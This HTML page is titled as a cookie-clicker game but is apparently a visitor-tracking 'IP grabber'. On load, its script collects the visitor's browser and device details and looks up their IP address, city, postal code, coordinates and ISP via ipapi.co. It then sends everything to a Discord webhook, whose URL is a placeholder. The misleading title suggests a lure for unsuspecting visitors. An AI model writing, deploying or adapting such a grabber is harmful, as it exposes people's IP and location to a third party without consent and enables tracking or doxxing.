<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tuff Cookie Cliker</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f1117;
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: #1a1d27;
            padding: 30px 40px;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
            max-width: 700px;
            width: 100%;
            border: 1px solid #2e3342;
        }
        h1 {
            font-weight: 400;
            font-size: 1.8rem;
            margin-top: 0;
            border-bottom: 1px solid #2e3342;
            padding-bottom: 12px;
            color: #b7c0d0;
            letter-spacing: 0.5px;
        }
        .info-grid {
            display: grid;
            grid-template-columns: 1fr 2fr;
            gap: 8px 20px;
            margin-top: 10px;
        }
        .label {
            font-weight: 500;
            color: #8892aa;
            word-break: break-word;
        }
        .value {
            color: #d4dcec;
            word-break: break-word;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
        }
        .loading {
            color: #f0c27f;
            text-align: center;
            padding: 20px 0;
        }
        .footer {
            margin-top: 24px;
            font-size: 0.8rem;
            color: #4a5268;
            text-align: right;
            border-top: 1px solid #252b3a;
            padding-top: 16px;
        }
        .status {
            margin-top: 16px;
            padding: 10px;
            border-radius: 8px;
            font-size: 0.9rem;
            text-align: center;
        }
        .status.success {
            background: #1e3a2a;
            color: #7ddfa0;
            border: 1px solid #2a6b3f;
        }
        .status.fail {
            background: #3a1e1e;
            color: #df7d7d;
            border: 1px solid #6b2a2a;
        }
        .status.pending {
            background: #2a2a1e;
            color: #dfd07d;
            border: 1px solid #6b652a;
        }
    </style>
</head>
<body>
<div class="container" id="app">
    <h1>🖥️ Client Fingerprint</h1>
    <div id="infoDisplay">
        <div class="loading">⏳ Gathering data...</div>
    </div>
    <div id="webhookStatus" class="status pending">⏳ Sending to webhook...</div>
    <div class="footer">collected via navigator + ipapi.co</div>
</div>

<script>
    (function() {
        // ===== CONFIGURATION =====
        // REPLACE THIS URL WITH YOUR ACTUAL WEBHOOK ENDPOINT
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
        // =========================

        const display = document.getElementById('infoDisplay');
        const statusEl = document.getElementById('webhookStatus');

        // ----- 1. BROWSER / DEVICE (client-only) -----
        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.indexOf('Firefox') > -1) return 'Firefox';
            if (ua.indexOf('SamsungBrowser') > -1) return 'Samsung Internet';
            if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
            if (ua.indexOf('Edge') > -1) return 'Edge (Chromium)';
            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) return 'Chrome';
            if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) return 'Safari';
            return 'Unknown Browser';
        }

        function getOS() {
            const ua = navigator.userAgent;
            if (ua.indexOf('Win') > -1) return 'Windows';
            if (ua.indexOf('Mac') > -1) return 'macOS';
            if (ua.indexOf('Linux') > -1) return 'Linux';
            if (ua.indexOf('Android') > -1) return 'Android';
            if (ua.indexOf('like Mac') > -1) return 'iOS';
            return 'Unknown OS';
        }

        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/Mobi|Android|iPhone|iPad|iPod|Opera Mini|BlackBerry/i.test(ua)) {
                return 'Mobile / Tablet';
            }
            return 'Desktop / Laptop';
        }

        function getScreenRes() {
            return `${window.screen.width} x ${window.screen.height}`;
        }

        function getLanguage() {
            return navigator.language || navigator.userLanguage || 'unknown';
        }

        function getTimezone() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
        }

        function getPlatform() {
            return navigator.platform || 'unknown';
        }

        // ----- 2. IP + CITY (via external API) -----
        function fetchIpInfo() {
            return new Promise((resolve) => {
                const apiUrl = 'https://ipapi.co/json/';
                fetch(apiUrl)
                    .then(response => {
                        if (!response.ok) throw new Error('API error');
                        return response.json();
                    })
                    .then(data => {
                        resolve({
                            ip: data.ip || 'N/A',
                            city: data.city || 'N/A',
                            region: data.region || 'N/A',
                            country: data.country_name || 'N/A',
                            postal: data.postal || 'N/A',
                            latitude: data.latitude || 'N/A',
                            longitude: data.longitude || 'N/A',
                            org: data.org || 'N/A'
                        });
                    })
                    .catch(() => {
                        resolve({
                            ip: 'API unavailable (local)',
                            city: 'N/A',
                            region: 'N/A',
                            country: 'N/A',
                            postal: 'N/A',
                            latitude: 'N/A',
                            longitude: 'N/A',
                            org: 'N/A'
                        });
                    });
            });
        }

        // ----- 3. SEND TO WEBHOOK -----
        async function sendToWebhook(data) {
            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
                statusEl.className = 'status fail';
                statusEl.textContent = '⚠️ Webhook not configured. Set WEBHOOK_URL.';
                return false;
            }

            try {
                // Build a clean message for Discord (or any webhook)
                const payload = {
                    content: null,
                    embeds: [
                        {
                            title: '🕵️ New Visitor Data',
                            color: 0x5865F2,
                            fields: [
                                { name: 'IP Address', value: data.ipInfo.ip, inline: true },
                                { name: 'City', value: data.ipInfo.city, inline: true },
                                { name: 'Region', value: data.ipInfo.region, inline: true },
                                { name: 'Country', value: data.ipInfo.country, inline: true },
                                { name: 'ISP / Org', value: data.ipInfo.org, inline: false },
                                { name: 'Browser', value: data.browser, inline: true },
                                { name: 'OS', value: data.os, inline: true },
                                { name: 'Device Type', value: data.device, inline: true },
                                { name: 'Screen Resolution', value: data.resolution, inline: true },
                                { name: 'Language', value: data.language, inline: true },
                                { name: 'Time Zone', value: data.timezone, inline: true },
                                { name: 'Platform', value: data.platform, inline: true },
                                { name: 'User Agent', value: navigator.userAgent.substring(0, 200) + (navigator.userAgent.length > 200 ? '...' : ''), inline: false }
                            ],
                            timestamp: new Date().toISOString(),
                            footer: { text: 'Collected via HTML page' }
                        }
                    ]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    statusEl.className = 'status success';
                    statusEl.textContent = '✅ Data sent to webhook successfully!';
                    return true;
                } else {
                    const errorText = await response.text();
                    throw new Error(`HTTP ${response.status}: ${errorText}`);
                }
            } catch (error) {
                console.error('Webhook error:', error);
                statusEl.className = 'status fail';
                statusEl.textContent = `❌ Failed to send: ${error.message || 'unknown error'}`;
                return false;
            }
        }

        // ----- 4. RENDER + SEND -----
        async function renderAndSend() {
            // local data
            const browser = getBrowserName();
            const os = getOS();
            const device = getDeviceType();
            const resolution = getScreenRes();
            const language = getLanguage();
            const tz = getTimezone();
            const platform = getPlatform();

            // IP data
            const ipInfo = await fetchIpInfo();

            // Build data object
            const fullData = {
                browser,
                os,
                device,
                resolution,
                language,
                timezone: tz,
                platform,
                ipInfo
            };

            // Render grid
            const items = [
                { label: 'IP Address', value: ipInfo.ip },
                { label: 'City', value: ipInfo.city },
                { label: 'Region', value: ipInfo.region },
                { label: 'Country', value: ipInfo.country },
                { label: 'Postal Code', value: ipInfo.postal },
                { label: 'Coordinates', value: `${ipInfo.latitude}, ${ipInfo.longitude}` },
                { label: 'ISP / Org', value: ipInfo.org },
                { label: 'Browser', value: browser },
                { label: 'Operating System', value: os },
                { label: 'Device Type', value: device },
                { label: 'Screen Resolution', value: resolution },
                { label: 'Language', value: language },
                { label: 'Time Zone', value: tz },
                { label: 'Platform (navigator)', value: platform }
            ];

            let html = '<div class="info-grid">';
            for (let item of items) {
                html += `<div class="label">${item.label}</div><div class="value">${item.value}</div>`;
            }
            html += '</div>';
            display.innerHTML = html;

            // Send to webhook
            await sendToWebhook(fullData);
        }

        renderAndSend();
    })();
</script>
</body>
</html>
